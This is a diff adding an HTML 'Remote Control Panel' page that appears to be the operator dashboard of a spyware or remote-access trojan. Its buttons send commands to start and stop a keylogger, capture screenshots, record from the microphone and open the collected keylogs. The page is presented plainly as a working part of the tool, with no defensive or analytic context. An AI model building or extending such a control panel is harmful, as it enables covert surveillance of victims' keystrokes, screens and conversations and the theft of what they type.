@@ -1,0 +1,23 @@
+
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Remote Control Dashboard</title>
+    <script src="https://cdn.socket.io/4.3.2/socket.io.min.js"></script>
+ </head>
+<body style="font-family:sans-serif; background:#111; color:#0f0;">
+    <h1>Remote Control Panel</h1>
+    <button onclick="sendCmd('keylog_start')">Start Keylogger</button>
+    <button onclick="sendCmd('keylog_stop')">Stop Keylogger</button>
+    <button onclick="sendCmd('screenshot')">Take Screenshot</button>
+    <button onclick="sendCmd('record_start')">Start Mic</button>
+    <button onclick="sendCmd('record_stop')">Stop Mic</button>
+    <button onclick="window.open('/get_keylogs', '_blank')">Show Keylogs</button>
+    <script>
+        const socket = io();
+        function sendCmd(cmd) {
+            fetch('/command/' + cmd).then(res => res.text()).then(alert);
+        }
+    </script>
+</body>
+</html>
